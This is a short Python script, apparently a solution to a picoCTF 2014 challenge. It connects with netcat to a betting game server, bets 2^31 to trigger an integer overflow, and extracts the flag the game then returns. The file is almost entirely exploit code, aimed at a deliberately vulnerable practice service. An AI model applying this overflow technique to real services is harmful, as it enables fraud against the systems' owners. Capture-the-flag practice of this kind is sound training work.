import sys
import pexpect
import re


PROMPT = '> '
NO_MORE = "Yerr can't bet more than ya got!"
OVER = "You ain't got no money, get outta here!"
GET_FLAG = "Great, I'm fresh outta cash. Take this flag instead.\r\n([^\r\n]*)"


def guess(host, port):
    child = pexpect.spawn('nc %s %d' % (host, port))
    child.logfile = sys.stdout
    choice = 5
    money = (1 << 31)
    while True:
        child.expect([PROMPT, pexpect.EOF])
        ret = child.before
        flag = re.findall(GET_FLAG, ret)
        if flag != []:
            return flag
        over = re.findall(OVER, ret)
        if over != []:
            return "game over"
        child.sendline(str(money))
        child.expect(PROMPT)
        no_more = re.findall(NO_MORE, child.before)
        if no_more != []:
            child.sendline('1')
            child.expect(PROMPT)
            child.sendline(str(choice))
        else:
            child.sendline(str(choice))


def main():
    flag = guess('vuln2014.picoctf.com', 4547)
    print 'flag = ' + str(flag)


if __name__ == '__main__':
    main()
